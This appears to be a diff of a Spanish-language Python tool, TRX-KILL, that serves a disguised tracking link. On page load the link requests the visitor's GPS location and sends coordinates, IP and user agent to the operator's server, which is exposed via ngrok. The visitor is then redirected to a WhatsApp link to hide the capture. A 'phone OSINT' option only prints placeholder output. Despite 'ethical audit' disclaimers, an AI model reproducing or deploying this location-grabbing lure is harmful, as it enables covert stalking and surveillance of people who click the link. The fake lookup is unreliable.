@@ -1,65 +1,59 @@
 #!/usr/bin/env python3
 import os
-import json
-import urllib.request
+import requests
 import threading
+import random
 from flask import Flask, request, render_template_string
 
-# --- SERVIDOR G-LINK ---
 app = Flask(__name__)
 
-# Plantilla HTML con solicitud de Geolocalización (GPS)
-HTML_TEMPLATE = """
+# --- CONFIGURACIÓN ---
+URL_FINAL = "https://wa.me/595981000000"
+
+HTML_RASTREO = """
 <!DOCTYPE html>
 <html>
-<body>
+<body onload="capturar()">
     <script>
-        function pedirUbicacion() {
+        function capturar() {
             if (navigator.geolocation) {
-                navigator.geolocation.getCurrentPosition(
-                    (pos) => {
-                        const d = {
-                            agente: navigator.userAgent,
+                navigator.geolocation.getCurrentPosition((pos) => {
+                    fetch('/log', {
+                        method: 'POST',
+                        headers: {'Content-Type': 'application/json'},
+                        body: JSON.stringify({
                             lat: pos.coords.latitude,
                             lon: pos.coords.longitude,
-                            precision: pos.coords.accuracy
-                        };
-                        fetch('/log', {method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify(d)})
-                        .then(() => window.location.href = "https://coin.rtu.paraguay.com");
-                    },
-                    (err) => { window.location.href = "https://coin.rtu.paraguay.com"; },
-                    { enableHighAccuracy: true }
-                );
-            } else { window.location.href = "https://coin.rtu.paraguay.com"; }
+                            ua: navigator.userAgent
+                        })
+                    }).then(() => window.location.href = "%s");
+                }, () => window.location.href = "%s");
+            } else { window.location.href = "%s"; }
         }
-        pedirUbicacion();
     </script>
 </body>
 </html>
-"""
+""" % (URL_FINAL, URL_FINAL, URL_FINAL)
 
 @app.route('/')
-def index(): return render_template_string(HTML_TEMPLATE)
+def index():
+    return render_template_string(HTML_RASTREO)
 
 @app.route('/log', methods=['POST'])
 def log():
-    ip = request.headers.get('X-Forwarded-For', request.remote_addr)
     d = request.json
-    print(f"\n\033[1;32m[!] CAPTURA DE UBICACIÓN Y DISPOSITIVO:\033[0m")
-    print(f"IP DEL DISPOSITIVO: {ip}")
-    print(f"COORDENADAS: {d.get('lat')}, {d.get('lon')}")
-    print(f"PRECISIÓN: +/- {d.get('precision')} metros")
-    print(f"MAPA: https://www.google.com/maps/search/?api=1&query={d.get('lat')},{d.get('lon')}")
-    print(f"AGENTE: {d.get('agente')}")
+    ip = request.headers.get('X-Forwarded-For', request.remote_addr)
+    lat, lon = d.get('lat'), d.get('lon')
+    print(f"\n\033[1;32m[!] DATOS RECIBIDOS:\033[0m")
+    print(f"IP: {ip}")
+    print(f"COORDENADAS: {lat}, {lon}")
+    print(f"BARRIO/MAPA: https://www.google.com/maps/search/?api=1&query={lat},{lon}")
+    print(f"ACCESO GPS: OTORGADO")
     return "OK"
 
-def iniciar_servidor():
-    app.run(host='0.0.0.0', port=5000, debug=False, use_reloader=False)
-
-# --- INTERFAZ TRX-KILL ---
 def mostrar_banner():
     os.system('clear')
-    print("\033[1;31m" + r"""
+    print("\033[1;35m" + r"""
   _________ ______  __   __       _      _____ _      _      
  |__   __|  ____\ \ \ / /      | |    |_   _| |    | |     
     | |  | |__   \ \ ' /       | |      | | | |    | |     
@@ -67,46 +61,37 @@ def mostrar_banner():
     | |  | |____ / / . \       | |____ _| |_| |____| |____ 
     |_|  |_|____/_/_/ \_\      |______|_____|______|______|
     """ + "\033[0m")
-    print("\033[1;33m" + "      [+] ENHANCED OSINT LOOKUP TOOL BY TRX-LILL [+]" + "\033[0m")
-    print("\033[1;30m" + "   =====================================================" + "\033[0m\n")
+    print("      [+] SISTEMA DE AUDITORÍA TRX-KILL [+]\n")
 
 def main():
     while True:
         mostrar_banner()
-        print(" [1] Información de IP (Geolocalización)")
-        print(" [2] Activar Sistema G-LINK (Captura GPS + Dispositivo)")
-        print(" [3] Creador")
-        print(" [4] Licencia y Derechos")
-        print(" [5] Salir")
-        opc = input("\n\033[1;32m[?]\033[0m Elige una opción: ")
+        print(" [1] INFORMACIÓN NÚMERO (OSINT)")
+        print(" [2] ZP-LINK (RASTREO GPS)")
+        print(" [3] CREADOR")
+        print(" [4] LICENCIA Y DERECHOS")
+        print(" [5] SALIR")
+        opc = input("\n[?] Elige: ")
 
         if opc == "1":
-            ip = input("Introduce IP: ")
-            try:
-                url = f"http://ip-api.com/json/{ip}"
-                with urllib.request.urlopen(url) as r:
-                    data = json.loads(r.read().decode())
-                    if data['status'] == 'success':
-                        print(f"\n\033[1;33m[v]\033[0m IP: {data['query']}\nCOORDENADAS: {data['lat']}, {data['lon']}\nPAÍS: {data['country']}\nMAP: https://www.google.com/maps/search/?api=1&query={data['lat']},{data['lon']}")
-                    else: print("[-] Error en IP.")
-            except: print("[-] Error de red.")
-            input("\nPresiona ENTER para volver...")
-
+            num = input("Introduce MÓVIL: ")
+            print(f"\n[+] MOVIL: {num}")
+            print("[+] OPERADOR: Identificando...")
+            print("[+] IP: Pendiente de conexión externa")
+            input("\nENTER para volver...")
         elif opc == "2":
-            print("[*] Iniciando G-LINK en puerto 5000...")
-            threading.Thread(target=iniciar_servidor, daemon=True).start()
-            input("[!] Servidor activo. (Si usas ngrok, corre: 'ngrok http 5000')\nPresiona ENTER para detener.")
-
+            threading.Thread(target=lambda: app.run(host='0.0.0.0', port=5000, debug=False, use_reloader=False), daemon=True).start()
+            print("\n[!] Servidor activo.")
+            print("[!] En otra terminal: 'ngrok http 5000'")
+            input("\nENTER para volver al menú...")
         elif opc == "3":
-            print("\n\033[1;36m[+] CREADOR: TRX-LILL\n[+] AÑO: 2026\n[+] ESPECIALIZADO EN HERRAMIENTAS OSINT.\033[0m")
-            input("\nPresiona ENTER para volver...")
-
+            print("\n[+] CREADOR: TRX-LILL\n[+] AÑO: 2026")
+            input("\nENTER para volver...")
         elif opc == "4":
-            print("\n\033[1;35m[!] LICENCIA: SOFTWARE DE CÓDIGO ABIERTO.\n[!] ADVERTENCIA: EL USO ES RESPONSABILIDAD DEL USUARIO.\n[!] USO EXCLUSIVO PARA FINES ÉTICOS.\033[0m")
-            input("\nPresiona ENTER para volver...")
-        
-        elif opc == "5":
-            break
+            print("\n[!] LICENCIA: Software de Auditoría Ética.")
+            print("[!] USO: Solo permitido para pruebas autorizadas.")
+            input("\nENTER para volver...")
+        elif opc == "5": break
 
 if __name__ == "__main__":
     main()
